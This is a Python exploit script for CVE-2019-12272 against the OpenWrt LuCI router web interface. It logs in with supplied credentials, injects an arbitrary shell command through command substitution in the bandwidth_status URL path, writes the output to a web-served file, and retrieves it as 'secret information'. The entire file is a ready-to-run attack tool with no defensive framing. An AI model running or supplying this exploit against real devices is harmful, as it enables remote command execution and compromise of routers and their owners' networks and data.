#!/usr/bin/python3

import argparse
import requests
from urllib.parse import urlparse

class hack_unit():
    def __init__(self, args):
        self.username = args.username
        self.password = args.password
        self.command = args.command
        self.target = args.target
        self.filename = args.filename
        self.cookies = ''
        self.stok = ''
        self.headers = {
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'http://{target}'.format(target=self.target),
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': 'http://{target}/cgi-bin/luci'.format(target=self.target),
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }

    def login(self):
        try:
            data = {
                'luci_username': '{username}'.format(username=self.username),
                'luci_password': '{passwd}'.format(passwd=self.password)
            }
            response = requests.post(self.headers['Referer'], headers=self.headers, data=data, verify=False, allow_redirects=False)
            location = response.headers["Location"]
            # self.stok = location.split(';')[-1]
            self.stok = urlparse(location).params
            self.cookies = response.cookies
            print('[+] Successful login at {site}.'.format(site=self.headers['Referer']))
        except:
            print('[-] Login failed, please retry.')
            exit(1)

    def cve_exploit(self):
        try:
            url = 'http://{target}/cgi-bin/luci/;{stok}/admin/status/realtime/bandwidth_status/eth0$({command}%3e{filename})'.format(target=self.target, stok=self.stok, command=self.command, filename=self.filename)
            response = requests.get(url, headers=self.headers, cookies=self.cookies, verify=False)
            print('[+] Successful exploitation of CVE-2019-12272.')
        except:
            print('[-] Inexploitable, please retry.')
            exit(1)

    def show_resp(self):
        try:
            url = 'http://{target}/{filename}'.format(target=self.target,filename=self.filename)
            response = requests.get(url, verify=False)
            print(':==================== SECRET INFORMATION ====================:')
            print(response.content.decode())
        except:
            print('[-] Vacant Echo')
            exit(1)

def hack_module():
    parser = argparse.ArgumentParser(description='Automated hack file of CVE-2019-12272.')
    requiredNames = parser.add_argument_group('required named arguments')
    requiredNames.add_argument('-t', '--target', help='Your target IP.', required=True)
    requiredNames.add_argument('-u', '--username', help='Target username.', required=True)
    requiredNames.add_argument('-p', '--password', help='Target password.', required=True)
    requiredNames.add_argument('-c', '--command', help='Bash command.', required=True)
    requiredNames.add_argument('-f', '--filename', help='The file for storing possible system response.', default='cmd.txt')
    args = parser.parse_args()
    
    unit = hack_unit(args)
    unit.login()
    unit.cve_exploit()
    unit.show_resp()
    
if __name__ == '__main__':
    hack_module()
